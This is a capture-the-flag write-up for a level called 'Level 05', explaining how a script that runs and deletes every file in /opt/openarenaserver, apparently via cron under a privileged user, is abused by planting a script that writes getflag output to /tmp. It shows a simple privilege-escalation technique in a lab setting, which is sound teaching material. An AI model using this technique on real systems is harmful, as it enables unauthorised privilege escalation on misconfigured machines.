# Level 05

There's nothing in the home directory of user `level05`.
So we try to see if there are files that can only be run by `flag05`, and there are.
In `/usr/sbin`, there's the file `openarenaserver` which is a script:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It basically runs every files there is in the `/opt/openarenaserver` and then deletes it. We can see that the script limits the CPU time for the process to 5sec, but we don't care since we just want a script that runs `getflag`.
We can suppose that there's a cronjob that runs this script periodically.
So our best bet would be to create the following script inside `/opt/openarenaserver/`:

```sh
#!/bin/sh

getflag > /tmp/flag_output
```

After waiting a bit we can indeed see that the files gets deleted and that our password is in `/tmp`.